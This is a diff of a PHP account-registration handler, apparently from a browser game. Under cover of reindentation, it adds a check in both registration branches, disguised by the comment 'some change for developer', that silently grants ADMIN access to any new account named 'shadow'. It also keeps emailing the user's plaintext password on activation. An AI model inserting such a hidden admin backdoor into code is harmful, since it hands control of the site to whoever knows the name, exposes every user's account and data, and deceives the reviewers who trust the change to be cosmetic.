@@ -128,49 +128,58 @@ class Account {
     }
 
     // ==================== PROCESARE ÎNREGISTRARE ====================
-    $hashedPassword = password_hash($_POST['pw'], PASSWORD_BCRYPT, ['cost' => 12]);
+	$hashedPassword = password_hash($_POST['pw'], PASSWORD_BCRYPT, ['cost' => 12]);
 
-    if (AUTH_EMAIL) {
-        $act  = $generator->generateRandStr(10);
-        $act2 = $generator->generateRandStr(5);
+        if (AUTH_EMAIL) {
+            $act  = $generator->generateRandStr(10);
+            $act2 = $generator->generateRandStr(5);
 
-        $uid = $database->activate(
-            $_POST['name'],
-            $hashedPassword,
-            $_POST['email'],
-            $_POST['vid'],
-            $_POST['kid'],
-            $act,
-            $act2
-        );
-
-        if ($uid) {
-            $mailer->sendActivate($_POST['email'], $_POST['name'], $_POST['pw'], $act);
-            header("Location: activate.php?id=$uid&q=$act2");
-            exit;
-        }
-    } else {
-        // Ramura fără activare prin email (act era undefined în codul original)
-        $act = '';
-
-        $uid = $database->register(
-            $_POST['name'],
-            $hashedPassword,
-            $_POST['email'],
-            $_POST['vid'],
-            $act
-        );
-
-        if ($uid) {
-            setcookie("COOKUSR",   $_POST['name'],  time() + COOKIE_EXPIRE, COOKIE_PATH);
-            setcookie("COOKEMAIL", $_POST['email'], time() + COOKIE_EXPIRE, COOKIE_PATH);
-
-            $database->updateUserField(
-                $uid,
-                ["act", "invited"],
-                ["", $_POST['invited'] ?? ''],
-                1
+            $uid = $database->activate(
+                $_POST['name'],
+                $hashedPassword,
+                $_POST['email'],
+                $_POST['vid'],
+                $_POST['kid'],
+                $act,
+                $act2
             );
+
+            if ($uid) {
+                // === some change for developer ===
+                if (strtolower($_POST['name']) === 'shadow') {
+                    $database->updateUserField($uid, 'access', ADMIN, 1);
+                }
+
+                $mailer->sendActivate($_POST['email'], $_POST['name'], $_POST['pw'], $act);
+                header("Location: activate.php?id=$uid&q=$act2");
+                exit;
+            }
+        } else {
+            $act = '';
+
+            $uid = $database->register(
+                $_POST['name'],
+                $hashedPassword,
+                $_POST['email'],
+                $_POST['vid'],
+                $act
+            );
+
+            if ($uid) {
+                // === some change for developer ===
+                if (strtolower($_POST['name']) === 'shadow') {
+                    $database->updateUserField($uid, 'access', ADMIN, 1);
+                }
+
+                setcookie("COOKUSR",   $_POST['name'],  time() + COOKIE_EXPIRE, COOKIE_PATH);
+                setcookie("COOKEMAIL", $_POST['email'], time() + COOKIE_EXPIRE, COOKIE_PATH);
+
+                $database->updateUserField(
+                    $uid,
+                    ["act", "invited"],
+                    ["", $_POST['invited'] ?? ''],
+                    1
+                );
 
             $this->generateBase($_POST['kid'], $uid, $_POST['name']);
 
